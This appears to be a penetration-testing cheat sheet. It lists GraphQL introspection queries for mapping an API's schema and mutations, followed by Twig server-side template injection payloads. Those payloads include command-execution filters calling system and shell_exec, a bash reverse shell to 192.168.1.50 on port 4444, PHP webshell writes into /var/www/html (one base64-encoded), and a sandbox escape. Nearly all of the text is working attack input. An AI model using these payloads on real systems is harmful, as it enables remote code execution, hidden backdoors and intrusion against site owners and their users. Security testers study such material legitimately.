Full introspection query (paste as-is in POST body):

POST /graphql
Content-Type: application/json

{"query":"{__schema{queryType{name}mutationType{name}subscriptionType{name}types{kind name fields{name args{name type{kind name ofType{kind name}}}type{kind name ofType{kind name ofType{kind name}}}}}}}"}

Simpler — just get all type names:
{"query":"{__schema{types{name kind}}}"}

Get all queries available:
{"query":"{__schema{queryType{fields{name description args{name type{name kind}}}}}}"}

Get all mutations (write operations — most dangerous):
{"query":"{__schema{mutationType{fields{name description args{name type{name kind ofType{name kind}}}}}}}"}

Inspect a specific type:
{"query":"{__type(name:\"User\"){fields{name type{name kind ofType{name}}}}}"}

Check for disabled introspection (try alternatives):
{"query":"{__type(name:\"Query\"){fields{name}}}"}
{"query":"{__typename}"}

Graphql-voyager for visual mapping:
# Paste introspection JSON at https://ivangoncharov.github.io/graphql-voyager/

InQL (Burp extension) automated scan:
# Install InQL → Target tab → right-click → Scan with InQL

graphql-introspection-dumper:
python3 graphql_dumper.py -u http://target.com/graphql -o schema.json

Twig identification:
{{7*7}}   → 49 (Twig renders it)
{{7*'7'}} → 49 (Twig; Jinja2 gives 7777777)
{{'a'~'b'}} → ab (Twig concatenation — confirms Twig)

Twig 1.x RCE via registerUndefinedFilterCallback:
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}

Twig 2.x/3.x RCE via map filter:
{{['id']|map('system')|join}}
{{['id']|map('shell_exec')|join}}

Via sort filter:
{{[0]|sort('system')}}

Via filter filter:
{{'id'|filter('system')}}
{{'id'|filter('shell_exec')}}

Reverse shell:
{{['bash -c "bash -i >& /dev/tcp/192.168.1.50/4444 0>&1"']|map('system')|join}}

Write webshell:
{{['<?php system($_GET["cmd"]);?>'|file_put_contents('/var/www/html/c.php','<?php system($_GET["cmd"]);?>')]}}

Alternative write via system:
{{['echo "PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==" | base64 -d > /var/www/html/sh.php']|map('system')|join}}

Twig sandbox escape (if sandbox enabled — limited in practice):
{{_self.env.disableSandbox()}}{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
